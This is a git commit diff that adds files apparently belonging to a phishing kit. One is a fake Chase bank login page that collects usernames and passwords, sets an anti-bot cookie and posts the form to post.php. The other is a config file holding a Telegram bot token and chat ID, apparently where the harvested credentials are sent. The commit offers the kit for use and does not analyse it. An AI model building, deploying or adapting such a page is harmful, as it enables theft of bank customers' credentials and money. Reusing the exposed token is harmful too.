2ad0c66367abc997e83819e55ed543adb4c00c7c
f26066710-commits <f26066710@gmail.com>
2026-06-25 17:37:41 -0500

    Add files via upload

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php 
+
+
+
+$token = "7558528904:AAGRm01JS8tOdBJYwwH9wm21xQt571ciYaI";
+$chat_id = "6381970533";
+
+
+?>
---
+++ login.php
@@ -0,0 +1,71 @@
+<?php
+include("main.php");
+setcookie('token',$antibotplot,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/chase.css">
+    <title>chase</title>
+</head>
+<body>
+    <header>
+        <img src="res/img/logo.svg">
+    </header>
+<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($antibotplot); ?>; }</script>
+
+<section>
+    <div class="Container">
+
+    <form action="post.php" method="post">
+
+      <div class="box">
+        <label>Username</label>
+        <input type="text" name="user" required>
+      </div>
+
+      <div class="box">
+        <label>Password</label>
+        <input type="Password" name="pass" required>
+       </div>
+
+       <div class="L">
+       <input type="checkbox"> Remember me
+       <span></span>
+        <input type="checkbox"> Use token
+       </div>
+       <div><button type="sumbit">Sign in</button></div>
+
+       <h5>Forgot username/password? ></h8>
+       <h5>Not Enrolled? Sign Up Now. ></h5>
+
+       
+<script src="./res/jquery.js"></script>
+<script src="./res/cdn/jq.js"></script>
+
+
+
+
+
+            
+        
+        
+
+    </div>
+
+
+
+
+
+
+
+
+
+    </form>
+    </section>
+    
+</body>
+</html>
